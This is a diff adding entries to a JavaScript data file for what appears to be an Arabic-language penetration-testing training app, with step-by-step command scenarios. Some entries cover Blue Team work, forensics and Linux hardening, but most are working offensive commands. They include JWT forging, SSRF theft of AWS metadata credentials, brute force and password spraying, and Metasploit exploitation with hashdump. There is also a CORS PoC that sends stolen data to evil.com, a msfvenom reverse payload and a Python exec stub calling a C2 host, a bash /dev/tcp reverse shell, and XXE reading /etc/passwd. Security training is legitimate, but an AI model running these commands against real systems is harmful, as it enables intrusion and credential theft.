+    { title: 'اكتشاف Subdomains', desc: 'Subdomains قد تكشف بيئات تطوير وخوادم مخفية.', commands: [{ cmd: 'subfinder -d target.com -o subdomains.txt\ncurl -s "https://crt.sh/?q=%.target.com&output=json" | jq ".[].name_value"\namass enum -passive -d target.com\ncat subdomains.txt | sort -u', note: 'crt.sh مجاني وقوي جداً لاكتشاف Subdomains' }] },
+    { title: 'جمع إيميلات الموظفين', desc: 'theHarvester يجمع إيميلات من محركات البحث.', commands: [{ cmd: 'theHarvester -d target.com -b google -l 500\ntheHarvester -d target.com -b linkedin -l 200\ntheHarvester -d target.com -b all -f results.html', note: 'الإيميلات مفيدة للـ Phishing وتخمين بيانات الاعتماد' }] },
+    { title: 'Shodan للبنية التحتية', desc: 'Shodan يكشف الخوادم المكشوفة للإنترنت.', commands: [{ cmd: 'shodan search "org:TargetCompany"\nshodan search "hostname:target.com"\nshodan search "ssl.cert.subject.CN:target.com"\n# CLI:\nshodan host IP', note: 'ابحث عن: خوادم قديمة، كاميرات، أجهزة IoT' }] },
+    { title: 'Google Dorks للمعلومات الحساسة', desc: 'بحث متخصص لإيجاد معلومات حساسة مفهرسة.', commands: [{ cmd: '# في Google:\nsite:target.com filetype:pdf\nsite:target.com inurl:admin\nsite:target.com ext:env OR ext:sql OR ext:bak\n"target.com" "password" filetype:xls\n# GitHub:\ngithub search: "target.com" password', note: 'ابحث في GitHub عن credentials مرفوعة بالخطأ' }] }
+  ]
+},
+{
+  id: 42, icon: '🛡️', title: 'Blue Team - صيد التهديدات',
+  desc: 'سيناريو كامل لاكتشاف الاختراق والتحقيق فيه.',
+  difficulty: 'medium', type: 'Blue Team', time: '40-80 دقيقة',
+  steps: [
+    { title: 'تحليل Logs البنية التحتية', desc: 'Logs هي عيون الـ Blue Team.', commands: [{ cmd: '# Linux Auth Logs:\ngrep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn\n# Windows Events:\nGet-EventLog -LogName Security -InstanceId 4625 -Newest 50', note: '4625 = Failed Login في Windows' }] },
+    { title: 'اكتشاف Port Scan', desc: 'Nmap Scan يظهر في Logs.', commands: [{ cmd: 'snort -A console -i eth0 -c /etc/snort/snort.conf\n# في Suricata:\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n# تحليل:\ncat /var/log/suricata/fast.log | grep "SCAN"', note: 'Port Scan = بداية محتملة لهجوم' }] },
+    { title: 'تحليل Memory Dump', desc: 'Volatility لاكتشاف Malware في الذاكرة.', commands: [{ cmd: 'vol3 -f memory.dmp windows.pslist\nvol3 -f memory.dmp windows.netstat\nvol3 -f memory.dmp windows.malfind\nvol3 -f memory.dmp windows.cmdline', note: 'malfind يجد Shellcode المحقون في العمليات' }] },
+    { title: 'تحليل Persistence', desc: 'اكتشاف ما زرعه المهاجم للبقاء.', commands: [{ cmd: '# Windows:\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ScheduledTask | Where-Object {$_.State -eq "Ready"}\n# Linux:\ncrontab -l\nls /etc/cron.*\nsystemctl list-units --type=service', note: 'أي خدمة/مهمة غير مألوفة = اشتباه' }] },
+    { title: 'Containment وEradication', desc: 'عزل الجهاز المخترق وإزالة التهديد.', commands: [{ cmd: '# عزل الجهاز:\n# Windows: netsh firewall set opmode disable → منع كل حركة\nnetsh advfirewall firewall add rule name="BLOCK" dir=in action=block\n# Linux:\niptables -I INPUT -j DROP\niptables -I OUTPUT -j DROP\n# إزالة Malware:\nps aux | grep suspicious\nkill -9 PID', note: 'العزل أولاً قبل التحقيق لمنع الانتشار' }] }
+  ]
+},
+{
+  id: 43, icon: '🔒', title: 'اختبار JWT Token الكامل',
+  desc: 'سيناريو كامل لاختبار أمان JWT Tokens.',
+  difficulty: 'medium', type: 'Web App', time: '20-40 دقيقة',
+  steps: [
+    { title: 'التقاط JWT بـ Burp', desc: 'اعتراض Token من طلب مصادق.', commands: [{ cmd: '# في Burp Proxy:\n# قم بتسجيل الدخول\n# Intercept HTTP History\n# ابحث عن Authorization: Bearer TOKEN\n# انسخ الـ Token', note: 'Token عادةً في Header أو Cookie أو Response Body' }] },
+    { title: 'تحليل JWT', desc: 'فك ترميز الـ Token لفهم محتواه.', commands: [{ cmd: 'echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d\n# قسّم بالنقطة:\nTOKEN="eyJ..."\nHEADER=$(echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null)\nPAYLOAD=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null)\necho $HEADER && echo $PAYLOAD', note: 'Header يحتوي alg, Payload يحتوي claims' }] },
+    { title: 'Algorithm None Attack', desc: 'تغيير الخوارزمية لـ none لتجاوز التوقيع.', commands: [{ cmd: 'jwt_tool TOKEN -X a\n# أو يدوياً:\n# Header: {"alg":"none","typ":"JWT"}\n# Payload: {"sub":"admin","role":"admin"}\n# Signature: (فارغة)\n# اجمعها:\nbase64url(header) + "." + base64url(payload) + "."', note: 'إذا قبل الخادم = خلل خطير في التحقق من التوقيع' }] },
+    { title: 'كسر الـ Secret', desc: 'hashcat لكسر JWT بـ HMAC ضعيف.', commands: [{ cmd: 'echo "TOKEN" > jwt.txt\nhashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njwt_tool TOKEN -C -d rockyou.txt', note: 'Secret قصير = قابل للكسر بالقاموس' }] },
+    { title: 'توليد Token معدّل', desc: 'بعد كسر الـ Secret، أنشئ Token باسم admin.', commands: [{ cmd: 'jwt_tool TOKEN -S hs256 -p "cracked_secret" -I -pc role -pv admin\n# أو بـ Python:\nimport jwt\nnew_token = jwt.encode({"sub":"admin","role":"admin"}, "cracked_secret", algorithm="HS256")\nprint(new_token)', note: 'استخدم Token الجديد في Authorization Header' }] }
+  ]
+},
+{
+  id: 44, icon: '🦑', title: 'SSRF كامل خطوة بخطوة',
+  desc: 'اكتشاف واستغلال SSRF للوصول للموارد الداخلية.',
+  difficulty: 'hard', type: 'Web App', time: '30-60 دقيقة',
+  steps: [
+    { title: 'اكتشاف نقاط SSRF', desc: 'أي parameter يقبل URL = احتمال SSRF.', commands: [{ cmd: '# ابحث عن:\n?url=\n?redirect=\n?path=\n?image=\n?src=\n?link=\n# اختبار:\ncurl "http://target.com/fetch?url=http://127.0.0.1"', note: 'استجابة مختلفة عن الطلب العادي = اشتباه SSRF' }] },
+    { title: 'SSRF على خدمات داخلية', desc: 'استخدام SSRF لفحص الشبكة الداخلية.', commands: [{ cmd: '# فحص Ports داخلية:\nfor port in 22 80 443 3306 6379 8080; do\n  curl -s "http://target.com/fetch?url=http://127.0.0.1:$port" | grep -q "connected\\|HTTP" && echo "Port $port OPEN"\ndone', note: 'ابحث عن خدمات مثل Redis, Elasticsearch, Kubernetes API' }] },
+    { title: 'SSRF على AWS Metadata', desc: 'الاستهداف الأكثر تأثيراً.', commands: [{ cmd: 'curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"\ncurl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n# GCP:\ncurl "http://target.com/fetch?url=http://169.254.169.254/computeMetadata/v1/project/"', note: 'AWS Credentials = اختراق كامل للحساب السحابي' }], tip: 'IMDSv2 يتطلب Session Token — يُخفف الاستغلال لكن لا يمنعه دائماً.' },
+    { title: 'تجاوز فلاتر SSRF', desc: 'Bypasses شائعة للفلاتر.', commands: [{ cmd: '# IP في صيغ مختلفة:\nhttp://0177.0.0.1/  # Octal\nhttp://2130706433/  # Decimal\nhttp://0x7f000001/  # Hex\n# DNS Rebinding:\n# استخدم nip.io: http://127.0.0.1.nip.io/\n# Redirect:\nhttp://evil.com → 127.0.0.1', note: 'nip.io يحول IP لـ DNS تلقائياً' }] },
+    { title: 'SSRF للوصول لـ Internal APIs', desc: 'Elasticsearch وRedis كثيراً ما تكون مكشوفة داخلياً.', commands: [{ cmd: '# Redis:\ncurl "http://target.com/fetch?url=http://127.0.0.1:6379/"\n# Elasticsearch:\ncurl "http://target.com/fetch?url=http://127.0.0.1:9200/_cat/indices"\n# Internal Admin:\ncurl "http://target.com/fetch?url=http://192.168.1.100/admin"', note: 'Redis بدون auth على الشبكة الداخلية = RCE محتمل' }] }
+  ]
+},
+{
+  id: 45, icon: '🔓', title: 'اختبار Brute Force الاحترافي',
+  desc: 'سيناريو Brute Force شامل على خدمات متعددة.',
+  difficulty: 'medium', type: 'Network', time: '25-50 دقيقة',
+  steps: [
+    { title: 'تحضير قوائم الكلمات', desc: 'قوائم جيدة = نتائج أفضل.', commands: [{ cmd: '# قوائم مثبتة في Kali:\nls /usr/share/wordlists/\n# أفضل القوائم:\n# rockyou.txt: 14 مليون كلمة\n# SecLists: مجموعة ضخمة\nsudo apt install seclists\nls /usr/share/seclists/', note: 'rockyou.txt كافٍ لأغلب الحالات العملية' }] },
+    { title: 'Brute Force SSH بـ Hydra', desc: 'اختبار كلمات مرور SSH.', commands: [{ cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4 -V\n# قائمة مستخدمين:\nhydra -L users.txt -P rockyou.txt ssh://192.168.1.10 -t 4', note: '-t 4 مهم لـ SSH لتجنب الحجب' }] },
+    { title: 'Brute Force تسجيل دخول الويب', desc: 'FFUF لاختبار نموذج تسجيل دخول.', commands: [{ cmd: 'ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \\\n  -X POST -u http://target.com/login \\\n  -d "username=admin&password=FUZZ" \\\n  -H "Content-Type: application/x-www-form-urlencoded" \\\n  -fc 401', note: '-fc 401 تجاهل الاستجابات الفاشلة' }] },
+    { title: 'كلمات مرور مخصصة بـ CeWL', desc: 'CeWL تستخرج كلمات من موقع الهدف لبناء قاموس مخصص.', commands: [{ cmd: 'cewl https://target.com -d 3 -m 5 -w target_wordlist.txt\ncewl https://target.com --email -w emails.txt\n# دمج:\ncat rockyou.txt target_wordlist.txt | sort -u > combined.txt', note: 'القاموس المخصص أفضل بكثير للشركات' }] },
+    { title: 'اختبار Password Spray', desc: 'كلمة مرور واحدة على جميع المستخدمين.', commands: [{ cmd: '# SSH:\nhydra -L users.txt -p "Company@2024" ssh://192.168.1.10 -t 4\n# Active Directory:\ncrackmapexec smb DC_IP -u users.txt -p "Company@2024" --continue-on-success\n# Exchange/OWA:\n./SprayingToolkit/atomizer.py owa target.com "Company@2024" users.txt', note: 'Password Spray يتجنب Account Lockout' }] }
+  ]
+},
+{
+  id: 46, icon: '📊', title: 'Metasploit كامل من الأساس للاحتراف',
+  desc: 'سيناريو شامل يغطي Metasploit من البداية حتى الـ Post-Ex.',
+  difficulty: 'medium', type: 'Exploitation', time: '60-120 دقيقة',
+  steps: [
+    { title: 'إعداد قاعدة بيانات Metasploit', desc: 'PostgreSQL لحفظ نتائج الفحص.', commands: [{ cmd: 'sudo service postgresql start\nsudo msfdb init\nmsfconsole\ndb_status  # التحقق من الاتصال', note: 'Database مهمة لتنظيم الـ Engagements' }] },
+    { title: 'Nmap داخل Metasploit', desc: 'استيراد نتائج الفحص مباشرة.', commands: [{ cmd: '# في msfconsole:\ndb_nmap -sV -sC -p- 192.168.1.10\nhosts  # عرض الأجهزة\nservices  # عرض الخدمات\nvulns  # الثغرات المكتشفة', note: 'db_nmap يحفظ النتائج تلقائياً في قاعدة البيانات' }] },
+    { title: 'البحث وتشغيل Exploit', desc: 'البحث عن exploit بناءً على الخدمة المكتشفة.', commands: [{ cmd: 'search vsftpd\nuse exploit/unix/ftp/vsftpd_234_backdoor\ninfo  # معلومات الـ Exploit\nshow options  # الإعدادات المطلوبة\nset RHOSTS 192.168.1.10\nexploit', note: 'info يعطي تفاصيل كاملة عن الـ Exploit' }] },
+    { title: 'Meterpreter Post-Ex الأساسي', desc: 'استخراج المعلومات بعد الاختراق.', commands: [{ cmd: '# في Meterpreter:\nsysinfo\ngetuid\nhashdump\nshell\n# جمع المعلومات:\nrun post/multi/recon/local_exploit_suggester\nrun post/linux/gather/enum_system', note: 'hashdump يستخرج هاشات كلمات المرور' }] },
+    { title: 'نقل الـ Session ورفع الصلاحيات', desc: 'الانتقال من Shell لـ Meterpreter كامل.', commands: [{ cmd: 'use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun\n# ثم:\nuse post/multi/recon/local_exploit_suggester\nset SESSION 2\nrun', note: 'Shell to Meterpreter يحسن قدرات Post-Ex' }] }
+  ]
+},
+{
+  id: 47, icon: '🌩️', title: 'Cloud AWS Penetration Testing',
+  desc: 'سيناريو اختبار أمان AWS من الخارج إلى الداخل.',
+  difficulty: 'hard', type: 'Cloud', time: '60-120 دقيقة',
+  steps: [
+    { title: 'فحص Assets المكشوفة', desc: 'اكتشاف S3 Buckets وخدمات AWS المكشوفة.', commands: [{ cmd: '# S3:\naws s3 ls --no-sign-request s3://company-name\ns3scanner scan --buckets-file companies.txt\n# CloudFront:\ndig target.com | grep cloudfront', note: 'S3 Buckets العامة من أكثر مصادر تسرب البيانات' }] },
+    { title: 'الاستطلاع بدون Credentials', desc: 'معلومات عامة عن الـ Tenant.', commands: [{ cmd: '# معلومات Tenant:\ncurl "https://login.microsoftonline.com/target.com/.well-known/openid-configuration"\n# Account ID من الـ AMI:\ncurl http://169.254.169.254/latest/dynamic/instance-identity/document', note: 'Account ID مفيد لتحديد الهدف في AWS' }] },
+    { title: 'استغلال SSRF للوصول لـ IMDS', desc: 'SSRF في تطبيق EC2 = AWS Credentials.', commands: [{ cmd: 'curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"\ncurl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n# استخراج الـ Credentials:\ncurl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"', note: 'SSRF + IMDS = اختراق كامل للحساب السحابي' }] },
+    { title: 'استخدام Credentials المسروقة', desc: 'إعداد AWS CLI بالـ Credentials المسروقة.', commands: [{ cmd: 'export AWS_ACCESS_KEY_ID=STOLEN_KEY\nexport AWS_SECRET_ACCESS_KEY=STOLEN_SECRET\nexport AWS_SESSION_TOKEN=STOLEN_TOKEN\n# التحقق:\naws sts get-caller-identity\n# Enumerate:\naws iam list-users\naws s3 ls', note: 'aws sts = معرفة هوية الـ Credentials المستخدمة' }] },
+    { title: 'Privilege Escalation في AWS', desc: 'الانتقال من صلاحيات محدودة لـ Admin.', commands: [{ cmd: '# فحص الصلاحيات:\naws iam list-attached-user-policies --user-name USER\naws iam simulate-principal-policy --policy-source-arn ARN --action-names "iam:CreateAccessKey"\n# Pacu:\npython3 pacu.py\nset_keys\nrun iam__privesc_scan', note: 'Pacu = Metasploit لـ AWS' }] }
+  ]
+},
+{
+  id: 48, icon: '🏗️', title: 'إعداد Lab Vulnerable Apps',
+  desc: 'بناء بيئة تدريب كاملة بتطبيقات ضعيفة.',
+  difficulty: 'easy', type: 'Lab Setup', time: '30-60 دقيقة',
+  steps: [
+    { title: 'DVWA - Damn Vulnerable Web App', desc: 'DVWA أشهر تطبيق ضعيف للتدريب.', commands: [{ cmd: '# بـ Docker:\ndocker run -d -p 80:80 vulnerables/web-dvwa\n# ثم افتح: http://localhost\n# Default: admin/password\n# إعداد قاعدة البيانات من الواجهة', note: 'ابدأ بمستوى Low ثم Medium ثم High' }] },
+    { title: 'WebGoat - OWASP', desc: 'WebGoat يحتوي دروساً تفاعلية لكل ثغرة.', commands: [{ cmd: 'docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/goat-and-wolf\n# افتح: http://localhost:8080/WebGoat', note: 'WebGoat يشرح كل ثغرة بالتفصيل' }] },
+    { title: 'Metasploitable2', desc: 'VM Linux مليء بالثغرات الحقيقية.', commands: [{ cmd: '# تنزيل من:\n# https://sourceforge.net/projects/metasploitable/\n# Import في VirtualBox\n# Default: msfadmin/msfadmin\n# أو:\nnmap -sV 192.168.56.101', note: 'يحتوي FTP Backdoor, Samba Exploit, MySQL, وغيرها' }] },
+    { title: 'HackTheBox Labs', desc: 'منصة أونلاين لـ CTF وPentesting.', commands: [{ cmd: '# https://hackthebox.com\n# اتصل بـ VPN:\nsudo openvpn your_file.ovpn\n# ابدأ بـ Starting Point\n# ثم Easy Machines', note: 'HTB أفضل تدريب عملي للمحترفين' }] },
+    { title: 'TryHackMe للمبتدئين', desc: 'THM يقدم مسارات تعليمية منظمة.', commands: [{ cmd: '# https://tryhackme.com\n# الاتصال بـ VPN:\nsudo openvpn your_thm.ovpn\n# ابدأ بـ:\n# - Pre-Security Path\n# - Jr Penetration Tester Path\n# - Complete Beginner Path', note: 'THM مناسب جداً للمبتدئين' }] }
+  ]
+},
+{
+  id: 49, icon: '🔭', title: 'Digital Forensics - تحليل حادث',
+  desc: 'سيناريو كامل للتحقيق في حادث أمني.',
+  difficulty: 'hard', type: 'Forensics', time: '60-120 دقيقة',
+  steps: [
+    { title: 'جمع الأدلة الرقمية', desc: 'الخطوة الأولى: حفظ الأدلة بدون تغييرها.', commands: [{ cmd: '# أخذ صورة القرص:\ndd if=/dev/sdb of=/external/disk_image.dd bs=4096 status=progress\n# أخذ Dump للذاكرة (Linux):\napt install avml\navml /external/memory.lime\n# Hash للتحقق:\nsha256sum disk_image.dd > disk.sha256', note: 'Chain of Custody: وثّق كل خطوة' }] },
+    { title: 'تحليل صورة القرص', desc: 'Autopsy لتحليل القرص بصرياً.', commands: [{ cmd: 'autopsy &\n# http://127.0.0.1:9999/autopsy\n# New Case → Add Image → Analyze\n# ابحث في:\n# Web History\n# Recent Documents\n# Deleted Files', note: 'Autopsy يسرد الملفات المحذوفة تلقائياً' }] },
+    { title: 'تحليل الذاكرة', desc: 'Volatility لتحليل RAM Dump.', commands: [{ cmd: 'vol3 -f memory.lime linux.pslist\nvol3 -f memory.lime linux.bash\nvol3 -f memory.lime linux.netstat\nvol3 -f memory.lime linux.malfind', note: 'linux.bash يكشف أوامر Terminal الأخيرة' }] },
+    { title: 'تحليل Log Files', desc: 'Logs تحكي قصة الهجوم.', commands: [{ cmd: '# Linux:\ngrep -i "authentication failure" /var/log/auth.log\ngrep "Invalid user" /var/log/auth.log | awk \'{print $8}\' | sort | uniq -c\n# Apache:\nawk \'{print $1}\' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head', note: 'IP يظهر كثيراً = مصدر الهجوم' }] },
+    { title: 'إعداد تقرير الحادث', desc: 'التقرير هو نتيجة التحقيق.', commands: [{ cmd: '# هيكل تقرير الحادث:\n# 1. Executive Summary\n# 2. Timeline of Events\n# 3. Attack Vector المستخدم\n# 4. الأنظمة المتأثرة\n# 5. البيانات المسربة\n# 6. Indicators of Compromise (IOCs)\n# 7. التوصيات', note: 'التقرير الدقيق يمنع تكرار الحادث' }] }
+  ]
+},
+{
+  id: 50, icon: '🔮', title: 'اختبار GraphQL Security',
+  desc: 'سيناريو كامل لاختبار أمان GraphQL API.',
+  difficulty: 'hard', type: 'Web App', time: '30-60 دقيقة',
+  steps: [
+    { title: 'اكتشاف GraphQL', desc: 'البحث عن Endpoint وتأكيد وجود GraphQL.', commands: [{ cmd: 'curl -X POST http://target.com/graphql -H "Content-Type: application/json" \\\n  -d \'{"query":"{ __typename }"}\'\n# اكتشاف تلقائي:\nffuf -w endpoints.txt -u http://target.com/FUZZ -X POST \\\n  -d \'{"query":"{ __typename }"}\' \\\n  -H "Content-Type: application/json" -fc 400', note: 'استجابة JSON تحتوي data = GraphQL موجود' }] },
+    { title: 'Introspection Query', desc: 'استخراج كامل لـ Schema.', commands: [{ cmd: 'curl -X POST http://target.com/graphql -d \'{"query":"{ __schema { queryType { name } types { name fields { name } } } }"}\'\n# graphql-cop:\npip3 install graphql-cop\ngraphql-cop -t http://target.com/graphql', note: 'Introspection يكشف كل Types وFields' }] },
+    { title: 'GraphQL IDOR', desc: 'الوصول لبيانات مستخدمين آخرين.', commands: [{ cmd: '# طلبك الطبيعي:\ncurl -X POST http://target.com/graphql -d \'{"query":"{ user(id:1) { name email } }"}\'\n# IDOR:\ncurl -X POST http://target.com/graphql -d \'{"query":"{ user(id:2) { name email password } }"}\'\n# أو:\ncurl -X POST http://target.com/graphql -d \'{"query":"{ users { id name email password } }"}\'', note: 'users Query بدون auth = بيانات جميع المستخدمين' }] },
+    { title: 'Batch Query Attack', desc: 'إرسال queries كثيرة = Brute Force وDOS.', commands: [{ cmd: '# Brute Force بـ Batch:\ncurl -X POST http://target.com/graphql -d \'[\n  {"query":"mutation { login(username:\\"admin\\", password:\\"123\\") { token } }"},\n  {"query":"mutation { login(username:\\"admin\\", password:\\"password\\") { token } }"},\n  {"query":"mutation { login(username:\\"admin\\", password:\\"admin123\\") { token } }"}\n]\'', note: 'Batch يمكنه تجاوز Rate Limiting في بعض الأحيان' }] },
+    { title: 'GraphQL Injection', desc: 'Injection في GraphQL Arguments.', commands: [{ cmd: '# SQL Injection:\ncurl -X POST http://target.com/graphql -d \'{"query":"{ users(name: \\"admin OR 1=1--\\") { id name } }"}\'\n# NoSQL Injection:\ncurl -X POST http://target.com/graphql -d \'{"query":"{ users(name: {$gt: \\"\\"}) { id name password } }"}\'', note: 'GraphQL لا يمنع SQLi تلقائياً — يعتمد على التطبيق' }] }
+  ]
+},
+{
+  id: 51, icon: '💻', title: 'Linux Hardening - تقوية الأمان',
+  desc: 'تقوية نظام Linux للبيئة الإنتاجية.',
+  difficulty: 'medium', type: 'Blue Team', time: '40-80 دقيقة',
+  steps: [
+    { title: 'تحديث وتقليل الحزم', desc: 'تحديث النظام وإزالة غير الضروري.', commands: [{ cmd: 'apt update && apt upgrade -y\n# إزالة الحزم غير الضرورية:\napt remove --purge telnet rsh-server xinetd\napt autoremove && apt autoclean\n# قفل المنافذ:\nss -tlnp | grep -v "127.0.0.1"', note: 'كل حزمة غير مستخدمة = سطح هجوم إضافي' }] },
+    { title: 'تقوية SSH', desc: 'SSH الخاطئ = باب خلفي مفتوح.', commands: [{ cmd: 'cat >> /etc/ssh/sshd_config << EOF\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\nAllowUsers admin_user\nPort 2222\nClientAliveInterval 300\nClientAliveCountMax 2\nEOF\nsystemctl restart sshd', note: 'غيّر المنفذ لتقليل الـ Noise في Logs' }] },
+    { title: 'Firewall وSELinux/AppArmor', desc: 'تفعيل Firewall وMAC.', commands: [{ cmd: '# UFW:\nufw default deny incoming\nufw default allow outgoing\nufw allow 2222/tcp comment "SSH"\nufw allow 80/tcp && ufw allow 443/tcp\nufw enable\n# AppArmor:\napt install apparmor-utils\naa-enforce /etc/apparmor.d/*', note: 'least privilege = فتح ما تحتاجه فقط' }] },
+    { title: 'Fail2Ban وRate Limiting', desc: 'حماية من Brute Force.', commands: [{ cmd: 'apt install fail2ban\ncat > /etc/fail2ban/jail.local << EOF\n[DEFAULT]\nbantime = 3600\nmaxretry = 5\nfindtime = 600\n\n[sshd]\nenabled = true\nport = 2222\nEOF\nsystemctl enable --now fail2ban', note: 'Fail2Ban يحجب IPs تلقائياً' }] },
+    { title: 'تدقيق الملفات بـ AIDE', desc: 'AIDE يكتشف التغييرات غير المتوقعة في الملفات.', commands: [{ cmd: 'apt install aide\naide --init\nmv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n# تشغيل يومي:\n(crontab -l; echo "0 3 * * * /usr/bin/aide --check >> /var/log/aide.log") | crontab -', note: 'AIDE يكشف rootkits وtampering' }] }
+  ]
+},
+{
+  id: 52, icon: '🦊', title: 'اختبار CORS Misconfiguration',
+  desc: 'اكتشاف واستغلال إعدادات CORS الخاطئة.',
+  difficulty: 'medium', type: 'Web App', time: '20-40 دقيقة',
+  steps: [
+    { title: 'ما هو CORS؟', desc: 'CORS يتحكم في من يمكنه طلب موارد من النطاق.', commands: [{ cmd: '# اختبار CORS:\ncurl -H "Origin: https://evil.com" http://target.com/api/users -v\n# ابحث في الرد:\n# Access-Control-Allow-Origin: *\n# أو: Access-Control-Allow-Origin: https://evil.com', note: 'ACAO: * على بيانات حساسة = ثغرة' }] },
+    { title: 'اكتشاف CORS Misconfigurations', desc: 'أنواع إعدادات CORS الخاطئة.', commands: [{ cmd: '# Wildcard:\ncurl -H "Origin: https://evil.com" https://api.target.com/v1/user -H "Cookie: session=TOKEN" -v\n# Null Origin:\ncurl -H "Origin: null" https://api.target.com/user -v\n# Prefix Bypass:\ncurl -H "Origin: https://evil.com.target.com" https://api.target.com/user -v', note: 'Null Origin مدعوم في بعض الأنظمة القديمة' }] },
+    { title: 'إثبات CORS مع بيانات حساسة', desc: 'إذا ACAO يعكس الـ Origin مع بيانات حساسة.', commands: [{ cmd: '# PoC HTML:\n<scr'+'ipt>\nfetch("https://api.target.com/account", {\n  credentials: "include"\n})\n.then(r => r.text())\n.then(d => fetch("https://evil.com/steal?data=" + btoa(d)));<\/scr'+'ipt>', note: 'credentials:include يرسل الكوكيز مع الطلب' }] },
+    { title: 'تجاوز CORS Checks', desc: 'تقنيات لتجاوز قيود CORS.', commands: [{ cmd: '# Subdomain Takeover + CORS:\n# إذا ACAO: *.target.com\n# استغل subdomain مخترق\n# XSSI (JSON Hijacking):\n# إذا API يعيد JSONP\ncurl "https://api.target.com/data?callback=alert"', note: 'CORS + XSS = سرقة بيانات عابرة للنطاقات' }] },
+    { title: 'توثيق وإصلاح ثغرة CORS', desc: 'التوثيق الصحيح للثغرة.', commands: [{ cmd: '# توثيق:\n# Endpoint: https://api.target.com/account\n# Header: Origin: https://evil.com\n# الرد: ACAO: https://evil.com + ACAC: true\n\n# الإصلاح:\n# Whitelist Origins الصحيحة فقط\n# لا تستخدم * على endpoints تحتاج مصادقة\n# لا تعكس Origin تلقائياً', note: 'CORS صحيح = whitelist صارمة' }] }
+  ]
+},
+{
+  id: 53, icon: '🏴', title: 'Red Team - Initial Access كامل',
+  desc: 'سيناريو Red Team من Phishing إلى Shell.',
+  difficulty: 'hard', type: 'Red Team', time: '90-180 دقيقة',
+  steps: [
+    { title: 'Recon OSINT للهدف', desc: 'جمع المعلومات قبل الهجوم.', commands: [{ cmd: 'theHarvester -d target.com -b all -l 500\nsubfinder -d target.com\nlinkedin-scraper target.com  # أسماء موظفين\n# GitHub:\ncurl "https://api.github.com/search/repositories?q=target.com" | jq ".items[].name"', note: 'الـ Employees = أهداف Spear Phishing' }] },
+    { title: 'إعداد Phishing Email', desc: 'GoPhish لإدارة حملات التصيد.', commands: [{ cmd: 'wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip\nunzip gophish*.zip && chmod +x gophish\nsudo ./gophish\n# https://localhost:3333\n# أنشئ: Sending Profile → Template → Landing Page → Campaign', note: 'GoPhish يتتبع من فتح ومن ضغط الرابط' }] },
+    { title: 'إنشاء Payload خفي', desc: 'Payload يتجاوز AV ويتصل بـ C2.', commands: [{ cmd: '# Python Payload:\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=c2.evil.com LPORT=443 -f exe > update.exe\n# أو:\npython3 -c "\nimport subprocess, socket\ns = socket.socket()\ns.connect((\'C2_IP\', 443))\nexec(s.recv(9999))"', note: 'HTTPS على 443 يمر عبر معظم الـ Firewalls' }] },
+    { title: 'C2 Setup بـ Metasploit', desc: 'إعداد Listener لاستقبال الاتصال.', commands: [{ cmd: 'msfconsole -q\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter_reverse_https\nset LHOST 0.0.0.0\nset LPORT 443\nset ExitOnSession false\nexploit -j', note: '-j تشغيل كـ Job في الخلفية' }] },
+    { title: 'Post-Exploitation وPivoting', desc: 'بعد الدخول: فحص واستغلال الشبكة الداخلية.', commands: [{ cmd: '# في Meterpreter:\nrun post/multi/recon/local_exploit_suggester\nrun post/windows/gather/credentials/credential_collector\n# Pivoting:\nroute add 10.10.10.0/24 1\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j', note: 'SOCKS Proxy + Proxychains للوصول للشبكة الداخلية' }] }
+  ]
+},
+{
+  id: 54, icon: '🧲', title: 'اختبار Injection الكامل',
+  desc: 'سيناريو يغطي أنواع Injection المختلفة في تطبيق واحد.',
+  difficulty: 'hard', type: 'Web App', time: '40-80 دقيقة',
+  steps: [
+    { title: 'SQL Injection بـ sqlmap', desc: 'الأسرع لاكتشاف واستغلال SQLi.', commands: [{ cmd: 'sqlmap -u "http://target.com/?id=1" --dbs --batch\nsqlmap -u "http://target.com/?id=1" -D target --tables --batch\nsqlmap -u "http://target.com/?id=1" -D target -T users --dump --batch', note: '--batch يقبل كل الخيارات الافتراضية' }] },
+    { title: 'Command Injection', desc: 'اكتشاف واستغلال حقن الأوامر.', commands: [{ cmd: '# اختبار في Burp:\n127.0.0.1; id\n127.0.0.1 && whoami\n127.0.0.1 | id\n127.0.0.1 `id`\n# Reverse Shell:\n127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1', note: 'أي تطبيق يُنفذ ping/nslookup = هدف محتمل' }] },
+    { title: 'LDAP Injection', desc: 'حقن في استعلامات LDAP.', commands: [{ cmd: '# في حقل البحث:\n*)(uid=*\n*)(|(uid=*\n*)(|(password=*\n# في Burp:\nusername=*)(uid=*)(&password=ANYTHING\nusername=admin*', note: 'LDAP Injection نادر لكن خطير' }] },
+    { title: 'XML/XXE Injection', desc: 'حقن في تطبيقات تعالج XML.', commands: [{ cmd: '<?xml version="1.0"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>\n# في Burp:\n# غيّر Content-Type لـ application/xml\n# أضف الـ Payload', note: 'Content-Type: application/xml = نقطة إدخال XXE' }] },
